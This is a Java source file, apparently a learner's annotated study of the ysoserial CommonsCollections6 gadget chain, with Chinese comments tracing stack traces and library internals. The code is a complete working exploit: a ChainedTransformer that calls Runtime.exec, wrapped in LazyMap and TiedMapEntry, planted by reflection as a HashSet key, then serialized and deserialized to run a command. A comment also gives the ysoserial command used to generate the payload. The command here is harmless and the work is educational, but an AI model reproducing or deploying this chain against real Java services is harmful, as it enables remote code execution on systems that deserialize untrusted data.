package com.example.apache_collections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonCollections6 {

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        // java -jar ysoserial.jar CommonsCollections6 "galculator111" > ~/test_6.ser
        /*
        首先生成一个反序列化数据，设置一个非正常命令，看一下报错: 和 CommonCollection6里一致，

        ```java
        Exception in thread "main" org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'exec' on 'class java.lang.Runtime' threw an exception
    `        at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:132)
            at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)
            at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:151)
            at org.apache.commons.collections.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:73)
            at org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode(TiedMapEntry.java:120)
            at java.util.HashMap.hash(HashMap.java:362)
            at java.util.HashMap.put(HashMap.java:492)
            at java.util.HashSet.readObject(HashSet.java:309)
            at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
            at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
            at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
            at java.lang.reflect.Method.invoke(Method.java:606)
            at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)
            at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)
            at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)
            at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)
            at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)
            at com.example.apache_collections.CommonCollections6.main(CommonCollections6.java:10)`
        ```

        而PoC中给出的gadget链也是一致的
        ```java
        	Gadget chain:
            java.io.ObjectInputStream.readObject()
                java.util.HashSet.readObject()
                    java.util.HashMap.put()
                    java.util.HashMap.hash()
                        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                        org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                            org.apache.commons.collections.map.LazyMap.get()
                                org.apache.commons.collections.functors.ChainedTransformer.transform()
                                org.apache.commons.collections.functors.InvokerTransformer.transform()
                                java.lang.reflect.Method.invoke()
                                    java.lang.Runtime.exec()
        ```

         */
//        File f = new File("/home/uustay/test_6.ser");
//        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(f));
//        objectInputStream.readObject();
        /*
        可以看到，最后几个仍然和CommonCollection5有着类似的关系
        即LazyMap这里， 可以直接按之前的逻辑写出来
         */
        String commond = "galculator";
        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
        InvokerTransformer invokerTransformer = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null});
        InvokerTransformer invokerTransformer1 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null});
//        Runtime.getRuntime().exec();
        InvokerTransformer invokerTransformer2 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{commond});
        // 加不加这个，都不行。
        ConstantTransformer constantTransformer1 = new ConstantTransformer("1");

        Transformer[] transformers = new Transformer[]{constantTransformer, invokerTransformer, invokerTransformer1, invokerTransformer2};
//        ChainedTransformer chainedTransformer = new ChainedTransformer( new Transformer[]{ new ConstantTransformer(1)});
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap hashMap = new HashMap();
        Map lazyMap;
        lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

        /*
        然后看一下TiedMapEntry的`hashCode` 函数, 和 其`getValue` 函数
        ```java
            public int hashCode() {
                Object value = this.getValue();
                return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
            }

            ...

            public Object getValue() {
                return this.map.get(this.key);
            }
        ```
        可见， 仍然同 `CommonCollections5` 一致， 是由 `getValue`的 `map.get` 调用 `LazyMap.get`函数中的 `transform`函数得出
        通过声明 TiedMapEntry 并调用  hashCode 函数， 得出如下报错， 与PoC中上部分一致
        ```java
        Exception in thread "main" org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'exec' on 'class java.lang.Runtime' threw an exception
            at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:132)
            at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)
            at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:151)
            at org.apache.commons.collections.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:73)
            at org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode(TiedMapEntry.java:120)
            at com.example.apache_collections.CommonCollections6.main(CommonCollections6.java:101)
        ```
         */

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "foo");
//        tiedMapEntry.hashCode();

        /*
        最后分析这三个：
        ```java
            at java.util.HashMap.hash(HashMap.java:362)
            at java.util.HashMap.put(HashMap.java:492)
            at java.util.HashSet.readObject(HashSet.java:309)
        ```

        首先是`HashMap.put` 和 `HashMap.hash`函数:
        ```java

            public V put(K key, V value) {
                if (table == EMPTY_TABLE) {
                    inflateTable(threshold);
                }
                if (key == null)
                    return putForNullKey(value);
                int hash = hash(key);
                int i = indexFor(hash, table.length);
                for (Entry<K,V> e = table[i]; e != null; e = e.next) {
                    Object k;
                    if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {
                        V oldValue = e.value;
                        e.value = value;
                        e.recordAccess(this);
                        return oldValue;
                    }
                }

                modCount++;
                addEntry(hash, key, value, i);
                return null;
            }

            final int hash(Object k) {
                int h = hashSeed;
                if (0 != h && k instanceof String) {
                    return sun.misc.Hashing.stringHash32((String) k);
                }

                h ^= k.hashCode();

                // This function ensures that hashCodes that differ only by
                // constant multiples at each bit position have a bounded
                // number of collisions (approximately 8 at default load factor).
                h ^= (h >>> 20) ^ (h >>> 12);
                return h ^ (h >>> 7) ^ (h >>> 4);
            }
        ```

        由上可知， 需要将一个可hash的变量作为 key传入HashMap中

         */

        HashMap hashMap1 = new HashMap();



//        hashMap1.put(tiedMapEntry, "1");



        /*
        得到了如下报错： 已经很接近PoC的调用了
        ```java
        Exception in thread "main" org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'exec' on 'class java.lang.Runtime' threw an exception
            at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:132)
            at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)
            at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:151)
            at org.apache.commons.collections.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:73)
            at org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode(TiedMapEntry.java:120)
            at java.util.HashMap.hash(HashMap.java:362)
            at java.util.HashMap.put(HashMap.java:492)
            at com.example.apache_collections.CommonCollections6.main(CommonCollections6.java:168)
        ```

        看一下HashSet的构造函数,  和 readObject 函数,  可知如果想要通过HashSet 的 readObject， 需要将map值反射设置为`HashMap`
        并将`HashMap`的 `key` 值设置为 `TiedMapEntry`, 如果直设置的话，  不等反序列化就执行了。
        ```java
        public HashSet(int initialCapacity) {
            map = new HashMap<>(initialCapacity);
        }

        private void readObject(java.io.ObjectInputStream s)
            throws java.io.IOException, ClassNotFoundException {
            // Read in any hidden serialization magic
            s.defaultReadObject();

            // Read in HashMap capacity and load factor and create backing HashMap
            int capacity = s.readInt();
            float loadFactor = s.readFloat();
            map = (((HashSet)this) instanceof LinkedHashSet ?
                   new LinkedHashMap<E,Object>(capacity, loadFactor) :
                   new HashMap<E,Object>(capacity, loadFactor));

            // Read in size
            int size = s.readInt();

            // Read in all elements in the proper order.
            for (int i=0; i<size; i++) {
                E e = (E) s.readObject();
                map.put(e, PRESENT);
            }
        }
        ```
         */

        HashSet hashSet = new HashSet(1);
        hashSet.add("foo");
        Field field = hashSet.getClass().getDeclaredField("map");
        field.setAccessible(true);
        HashMap hashMap2 = (HashMap) field.get(hashSet);

        Field field1 = hashMap2.getClass().getDeclaredField("table");
        field1.setAccessible(true);

        Object[] array = (Object[]) field1.get(hashMap2);
        Object entry = array[0];
        System.out.println(entry.toString());
        Field field2 = entry.getClass().getDeclaredField("key");
        field2.setAccessible(true);
        field2.set(entry, tiedMapEntry);
        Map.Entry e = (Map.Entry) entry;
        System.out.println(e.getKey());




        byte[] a = do_serialize(hashSet);
        Object b = do_unserialize(a);


        /*
        由于不知道将`TiedMapEntry`的值通过反射设置在哪个字段上，  搜了一下相关的文章： https://blog.csdn.net/zhliro/article/details/46900757
        得知HashSwet 是由 HashMap 来实现的， 而实现的方式是在HashMap中维护了一张表， 即table字段，
        在HashMap中找到了一个函数, 即 table中的对象有Entry类的实例化对象，
        ```java
            void createEntry(int hash, K key, V value, int bucketIndex) {
                Entry<K,V> e = table[bucketIndex];
                table[bucketIndex] = new Entry<>(hash, key, value, e);
                size++;
            }
        ```

        这也就解释了， 为什么我们需要在`HashSet`类下的`HashMap` 对象中的 `table`字段，获取`Entry` 并获取其 `key`设置为 `TiedMapEntry`
        可以使用语句： 来查看对应的table长度及entry的内容
        ```java
        Object[] array = (Object[]) field1.get(hashMap2);
        Object entry = array[0];
        System.out.println(entry.toString());
        Field field2 = entry.getClass().getDeclaredField("key");
        field2.setAccessible(true);
        field2.set(entry, tiedMapEntry);
        Map.Entry e = (Map.Entry) entry;
        System.out.println(e.getKey());
        //foo=java.lang.Object@3fd23632
        //foo=java.lang.UNIXProcess@2857a293

        ```
        至此， 调试结束
         */



    }

    public static byte[]  do_serialize(Object obj) throws IOException {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(btout);
        oos.writeObject(obj);
        System.out.println("do serialized success");
        return btout.toByteArray();
    }

    public static Object do_unserialize(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream btin = new ByteArrayInputStream(data);
        ObjectInputStream ooi = new ObjectInputStream(btin);

        System.out.println("do unserialized success");
        return ooi.readObject();
    }
}
